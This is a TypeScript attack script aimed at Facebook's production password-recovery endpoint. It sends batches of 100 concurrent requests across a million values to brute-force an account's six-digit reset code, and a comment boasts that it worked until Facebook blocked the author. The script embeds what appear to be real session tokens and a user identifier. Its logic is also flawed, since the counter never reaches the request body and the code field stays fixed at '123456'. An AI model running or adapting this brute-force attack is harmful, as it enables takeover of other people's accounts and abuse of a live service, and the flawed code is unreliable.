/* POSTMAN METHOD FOR A FACEBOOK PROD BACKEND ATTACK */

//Worked but FB has temporarily blocked me for this attack lol.

import axios from "axios";
import qs from "qs";

//function to send a request to the server
async function sendRequest(otp: number) {

let data = qs.stringify({
  'jazoest': '2976',
  'lsd': 'AVoZaV8bXdc',
  'n': '123456',
  'reset_action': '1' 
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'https://www.facebook.com/recover/code/?em%5B0%5D=t%2A%2A%2A%40%2A%2A%2A%2A%2A%2A%2A&rm=send_email&spc=0&cuid=AYgcOwElBH0_IjDuENHjF0BRZKFp16WNAPVNO1otcFztZbCFJEuAg5r-3gaEQ64wfODJuCl3wjjfAS5Vu927y8TW44Iin30BLhZ7E3jTfYfyJx0pkcnsa3iYi5tQLfucRunjww4Q1foD55b6awRabiIWQu38oeTRYn8jQGje3SX0TYaZCkZ9nMPrFlfM3JK_P_INo1tddLaAKornkPrjoMnh&fl=default_recover&wsr=0',
  headers: { 
    'Content-Type': 'application/x-www-form-urlencoded', 
    'accept-language': 'en-US,en;q=0.9', 
    'content-type': 'application/x-www-form-urlencoded', 
    'dpr': '1.25', 
    'origin': 'https://www.facebook.com', 
    'priority': 'u=0, i', 
    'referer': 'https://www.facebook.com/recover/code/?em[0]=t***%40*******&rm=send_email&cuid=AYgcOwElBH0_IjDuENHjF0BRZKFp16WNAPVNO1otcFztZbCFJEuAg5r-3gaEQ64wfODJuCl3wjjfAS5Vu927y8TW44Iin30BLhZ7E3jTfYfyJx0pkcnsa3iYi5tQLfucRunjww4Q1foD55b6awRabiIWQu38oeTRYn8jQGje3SX0TYaZCkZ9nMPrFlfM3JK_P_INo1tddLaAKornkPrjoMnh&hash=AUYPJZ3zJ7UcLeDrVRo', 
    'sec-ch-prefers-color-scheme': 'dark', 
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"', 
    'sec-ch-ua-full-version-list': '"Google Chrome";v="135.0.7049.96", "Not-A.Brand";v="8.0.0.0", "Chromium";v="135.0.7049.96"', 
    'sec-ch-ua-mobile': '?0', 
    'sec-ch-ua-model': '""', 
    'sec-ch-ua-platform': '"Windows"', 
    'sec-ch-ua-platform-version': '"10.0.0"', 
    'sec-fetch-dest': 'document', 
    'sec-fetch-mode': 'navigate', 
    'sec-fetch-site': 'same-origin', 
    'sec-fetch-user': '?1', 
    'upgrade-insecure-requests': '1', 
    'viewport-width': '1536'
  },
  data : data
};

  try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch (e) {
    //console.log('Error: ', e);
  }
}

//calling the function in a loop to send multiple requests
async function main() {
  for (let i = 0; i < 1000000; i += 100) {
    const batch_array = [];
    console.log(i);

    //sending in a batch of 100 requests
    for (let j = 0; j < 100; j++) {
      batch_array.push(sendRequest(i + j))
    }
    await Promise.all(batch_array); //wait for all requests in this batch to complete only then conitinue to the next batch
  }
}

main();